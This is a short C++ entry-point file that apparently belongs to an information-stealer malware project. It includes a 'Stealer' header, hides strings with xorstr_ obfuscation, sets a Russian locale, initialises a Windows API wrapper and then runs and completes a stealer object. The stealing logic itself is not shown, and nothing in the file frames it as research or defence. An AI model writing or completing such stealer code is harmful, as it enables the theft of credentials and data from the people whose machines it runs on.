#include "stealer/Stealer.h"
#include "winapi.h"


int main() {
    setlocale(LC_ALL, xorstr_("ru-RU"));

    WinApi::Init();

    Stealer stealer;
    stealer.run();
    stealer.complete();

    return 0;
}
